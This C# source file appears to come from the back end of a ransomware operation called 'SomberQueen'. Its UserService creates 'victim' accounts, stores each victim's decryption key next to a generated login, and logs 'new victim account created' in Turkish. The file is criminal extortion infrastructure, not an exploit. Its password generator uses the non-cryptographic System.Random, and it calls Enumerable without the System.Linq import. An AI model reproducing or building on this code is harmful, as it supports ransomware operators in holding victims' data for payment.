using System;
using SomberQueen.Utilities;

namespace SomberQueen.Services
{
    public class UserService
    {
        private readonly DBHelper _db;

        public UserService(DBHelper db)
        {
            _db = db;
        }

        public (string username, string password) CreateVictimAccount(byte[] decryption_key)
        {
            string username = $"victim_{Guid.NewGuid().ToString("N").Substring(0, 8)}";
            string password = GenerateRandomPassword(12);
            Guid user_id = Guid.NewGuid();

            try
            {
                string userQuery = @"
                    INSERT INTO users (user_id, username, role, decryption_key, created_at) 
                    VALUES (@user_id, @username, @role, @decryption_key, @created_at)";
                
                _db.Execute(userQuery, new {
                    user_id,
                    username,
                    role = "victim",
                    decryption_key,
                    created_at = DateTime.UtcNow
                });

                string authQuery = @"
                    INSERT INTO auth_users (username, password, role, created_at) 
                    VALUES (@username, @password, @role, @created_at)";
                
                _db.Execute(authQuery, new {
                    username,
                    password, 
                    role = "victim",
                    created_at = DateTime.UtcNow
                });

                string logQuery = @"
                    INSERT INTO logs (user_id, action, created_at) 
                    VALUES (@user_id, @action, @created_at)";

                _db.Execute(logQuery, new {
                    user_id,
                    action = "Yeni kurban hesabı oluşturuldu",
                    created_at = DateTime.UtcNow
                });

                return (username, password);
            }
            catch (Exception ex)
            {
                _db.Execute(
                    "INSERT INTO logs (user_id, action, created_at) VALUES (@user_id, @action, @created_at)",
                    new {
                        user_id,
                        action = $"Hesap oluşturma hatası: {ex.Message}",
                        created_at = DateTime.UtcNow
                    }
                );
                throw;
            }
        }

        private string GenerateRandomPassword(int length)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            var random = new Random();
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }
    }
}
